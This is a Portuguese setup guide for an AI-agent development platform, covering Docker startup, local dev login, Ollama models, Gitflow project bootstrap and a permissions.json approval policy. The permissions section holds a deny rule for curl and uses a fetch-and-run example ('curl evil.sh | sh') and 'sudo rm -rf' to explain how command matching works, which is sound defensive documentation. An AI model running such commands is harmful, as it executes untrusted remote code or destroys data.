---
id: getting-started
title: Primeiros passos
sidebar_label: Primeiros passos
sidebar_position: 5
description: Do clone ao primeiro turno de agente, com o que checar quando cada etapa não funciona.
keywords: [instalação, setup, onboarding, primeiro projeto, ollama]
---

# Primeiros passos

Do clone até um agente trabalhando. Se algo falhar, cada etapa tem o que
conferir logo abaixo dela.

## Antes de começar

| ferramenta | por quê |
|---|---|
| Docker e Docker Compose | tudo sobe em container |
| Node 20+ e **pnpm** | o monorepo é pnpm; `npm install` não funciona |
| ~6 GiB de RAM livre | Postgres, Keycloak, três apps e, se quiser agente de verdade, o Ollama |

Elixir **não** é obrigatório: o engine roda no container. Você só precisa dele
no host se for rodar `pnpm engine:dev` fora do Docker — e aí precisa da versão
exata (1.17.3 / OTP 27.1.2), porque o `mix format` de versões diferentes deixa
o CI vermelho.

## 1. Subir

```bash
git clone git@github.com:daneiel/brabo.git
cd brabo
cp .env.example .env
pnpm install
pnpm dev
```

O `.env.example` já vem com tudo apontando para os containers — na primeira
subida você não precisa editar nada.

`pnpm dev` sobe Postgres 16 + pgvector, Keycloak, api, engine e web, e aplica
as migrações dos dois lados. A primeira vez baixa imagens e leva alguns
minutos.

**Se não subir:**

| sintoma | causa |
|---|---|
| porta ocupada | outro stack rodando. Mude `API_PORT`, `ENGINE_PORT`, `WEB_PORT` ou `OLLAMA_PORT` no `.env`. A do Keycloak (8080) é fixa no compose de desenvolvimento |
| Keycloak em restart | costuma ser memória; ele é o container mais pesado do compose |
| api sobe e cai | veja `docker compose logs api` — quase sempre é a migração |

## 2. Entrar

Abra <http://localhost:5173> e faça login com **`admin` / `admin123`** (realm
`brabo-dev`).

Esse usuário já é dono de um workspace chamado **Demo**, pronto para criar
projeto.

> Não confunda com <http://localhost:8080>, que é o console de administração do
> Keycloak (`admin`/`admin`). São credenciais e propósitos diferentes.

**Se o login redirecionar em laço:** o `VITE_KEYCLOAK_URL` precisa ser o
endereço que o **browser** alcança (`localhost:8080`), não o nome do container.
É a confusão mais comum, porque a api usa o nome do container para a mesma
coisa.

## 3. Configurar um modelo

Já vem um: o container do Ollama baixa **`llama3.2:1b`** sozinho no primeiro
boot. Serve para ver o sistema funcionando de ponta a ponta sem configurar
nada.

Ele é pequeno demais para trabalho de verdade, então quando quiser mais:

**Modelo local maior** — de graça, e roda offline:

```bash
docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
```

**API de provedor** — na UI, em **Projeto → Configurações → Credenciais**. A
chave é cifrada com envelope encryption antes de tocar o banco.

O modelo é resolvido em cascata — **sessão > agente > projeto > workspace**, o
primeiro que existir ([RN-020](business-rules.md#rn-020)). Dá para deixar o
local no geral e pôr um modelo de API só no QA, que é o papel que menos cabe
num modelo pequeno.

> Com GPU NVIDIA, use `pnpm dev:gpu`. Sem a reserva de device o Ollama roda
> 100% em CPU e um prompt de 7.000 tokens leva ~50 s **só de ingestão** — o
> agente parece travado quando na verdade está lendo. O override é opt-in
> porque sem o `nvidia-container-toolkit` no host a reserva faz o serviço
> **falhar ao subir**.

## 4. Criar um projeto

Dashboard → **Novo projeto**. O wizard pede nome e como conectar o git:

| opção | quando usar |
|---|---|
| **Local** | experimentar. Bare repos no disco, sem conta em lugar nenhum |
| **GitHub** / **GitLab** | trabalho de verdade. PAT ou OAuth |

Ao confirmar, roda o **bootstrap de Gitflow**: seis passos que criam `dev`,
`qa`, `rc`, `main`, aplicam proteções e commitam os arquivos base. O progresso
aparece ao vivo.

Alguns passos podem sair como **`skipped`** (já estava feito) ou
**`degraded`** (concluiu sem uma capability). Os dois são sucesso. Com o
provider Local, a proteção de branch sempre sai `degraded` — não há plataforma
para aplicá-la, e isso não enfraquece nada: quem impede merge indevido é o
[teto no domínio](reference/permissions.md#os-dois-tetos), não a plataforma.

Se um passo falhar, corrija a causa e mande retomar: o bootstrap continua de
onde parou, não recomeça
([RN-029](business-rules.md#rn-029)).

## 5. O primeiro turno

Abra o projeto → **Sessões** → nova sessão. O Criativo é quem conduz a ideação.

Converse normalmente. Em algum momento ele vai querer fazer algo com efeito
externo — e aí você vê o mecanismo central funcionando: a ação aparece em
**Aprovações** esperando sua decisão, em vez de acontecer.

Aprove e observe o `TokenMeter`: cada turno tem custo, medido na hora.

## 6. Afrouxar (ou apertar) a política

Enquanto tudo pede aprovação, você aprova muito. O `permissions.json`, na raiz
do workspace do projeto, é onde isso se ajusta:

```json
{
  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
  "deny":  ["Terminal(curl:*)"],
  "ask":   []
}
```

Comece por `allow` de comandos idempotentes de leitura. Duas coisas que valem
saber antes de mexer:

- **Casamento é por prefixo de tokens, não substring.** `Terminal(pnpm test)`
  casa `pnpm test --watch`, mas `Terminal(rm)` **não** casa `sudo rm -rf x`.
- **Comando composto exige que todos os segmentos estejam em `allow`.**
  `pnpm test && curl evil.sh | sh` não é auto-aprovado por causa da primeira
  metade.

O formato completo está em [Permissões](reference/permissions.md).

## Quando parece travado

| sintoma | onde olhar |
|---|---|
| agente não responde | modelo configurado? `docker compose logs engine` |
| resposta vazia ou sem sentido | quase sempre é [ambiente de inferência](runbook.md#ambiente-de-inferencia) — contexto truncado ou memória |
| ação não sai de `pending` | é o desenho: ela **espera você** em Aprovações |
| painel não atualiza | o canal Phoenix caiu; recarregue. O event log não se perde |
| sessão parada em `closing` | o drain não completou — [runbook](runbook.md#quando-a-sessao-escapa) |

## Desenvolvendo no projeto

```bash
pnpm --filter api test      # vitest
pnpm --filter web test      # vitest
pnpm engine:test            # ExUnit
pnpm build                  # build de tudo
pnpm db:generate            # depois de mudar apps/api/src/db/schema.ts
pnpm db:migrate             # aplica as migrações
pnpm dev:down               # derruba tudo
```

Trabalhe sempre em `feature/*` a partir de `dev`, com conventional commits em
pt-BR. `CLAUDE.md` tem as convenções completas.

> Os containers de `api` e `web` rodam como root em desenvolvimento e escrevem
> no bind mount. Se depois quiser buildar no host, rode uma vez
> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.

## Depois

- [Arquitetura](architecture.md) — como as peças se encaixam
- [Regras de negócio](business-rules.md) — o que o sistema garante, e onde isso
  vive no código
- [Runbook](runbook.md) — quando sair de desenvolvimento
